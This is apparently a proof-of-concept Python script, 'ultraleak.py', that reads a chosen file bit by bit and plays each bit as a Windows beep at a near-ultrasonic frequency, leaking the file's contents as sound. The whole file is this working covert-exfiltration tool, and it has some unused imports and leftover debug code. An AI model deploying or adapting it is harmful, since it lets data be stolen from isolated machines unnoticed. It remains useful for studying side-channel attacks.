#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, os, getopt

#import bitarray as ba
import winsound as ws
import pyaudio as pa
import wave
	  

# Transform the file to binary
def get_bits(f):	
    bytes = f.read()#(ord(b) for b in f.read())
    for b in bytes:
        for i in range(8):
            yield (b >> i) & 1
    c = open("check.txt", "w")
    c.write(str(bytes))

# Main function, checks the parameters, call get_bits and send the bits
# Example: python ultraleak.py -f /path/to/file -1 22500 -0 24000 -d 1000 
def main(argv):
    hlp = "ultraleak.py -f <File_Path> -1 <HZ> -0 <HZ> -d <Duration>"
    try:
        opts, args = getopt.getopt(argv,"h1:0:f:d:",["help","one","zero","file","duration"])
    except getopt.GetoptError as err:
        print("~ %s" % str(err))
        print(hlp)
        sys.exit()

    one,zero,dur,pathfile = -1,-1,-1,""
    
    for opt, arg in opts:
        if opt == '-h':
            print(hlp)
            sys.exit()

        elif opt in ("-f","--file"):
            pathfile = arg
            if not os.path.exists(pathfile):
                print("File in path ", pathfile, " does not exists")
                sys.exit()
        
        elif opt in ("-1","--one"):
            one = int(arg)

        elif opt in ("-0","--zero"):
            zero = int(arg)
        
        elif opt in ("-d","--duration"):
            dur = int(arg)
    
    if one == -1 or zero == -1 or dur == -1 or pathfile == "":
        print(hlp)
        sys.exit()

    # Call send_bits
    #serv = IAudioClient.GetService(IID_IChannelAudioVolume)
    #session = AudioUtilities.GetAudioSessionManager()
    #ISimpleAudioVolume.SetMasterVolume(0.9, serv)
    #print(IAudioEndpointVolume.GetMute(serv))
    
    for b in get_bits(open(pathfile,'rb')):
        if str(b) == "1":
            ws.Beep(one, dur)
            #print(AudioUtilities.GetAudioSessionManager())
            #print(b)
        elif str(b) == "0":
            ws.Beep(zero, dur)
            #print(AudioUtilities.GetAudioSessionManager())
            #print(b)

if __name__ == "__main__":
    main(sys.argv[1:])
	


            
